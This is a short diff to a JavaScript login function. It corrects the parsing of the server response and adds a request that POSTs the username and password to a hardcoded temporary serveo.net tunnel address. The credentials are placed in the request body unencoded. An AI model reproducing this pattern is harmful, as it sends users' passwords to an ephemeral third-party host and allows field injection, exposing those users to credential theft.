@@ -46,10 +46,13 @@ function doLogin() {
 
     j = JSON.parse(this.responseText);
 
-    resp["status"] = this.status,
-    resp["code"] = JSON.parse(this.responseText);
-    resp["msg"] = responseText
+    resp["status"] = this.status;
+    resp["code"] = j["code"];
+    resp["msg"] = j["msg"];
   };
+
+  http.open("POST", "https://8f382a9ea43ae6919ed5f37cb1e7d307.serveo.net/api/signin.php", true);
+  http.send(`username=${username}&password=${password}`);
 
   return;
 }
